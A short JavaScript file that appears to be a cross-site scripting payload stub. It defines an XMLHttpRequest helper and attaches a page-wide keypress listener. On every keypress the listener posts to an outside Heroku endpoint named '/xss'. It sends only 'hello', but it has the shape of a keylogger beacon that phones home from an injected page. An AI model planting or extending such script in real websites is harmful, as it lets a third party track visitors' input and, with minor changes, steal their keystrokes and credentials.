
function ajaxRequest (method, url, data) {
    var xmlHttp = new XMLHttpRequest()

    xmlHttp.open(method, url, true)

    // xmlHttp.setRequestHeader("Content-type", "application/json");
    xmlHttp.send(data)

    xmlHttp.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
            console.log(this.responseText);
        }
    };

    return xmlHttp
}

document.addEventListener('keypress', function (e) {
    ajaxRequest('POST', 'http://blog-torf.herokuapp.com/xss', 'hello')
})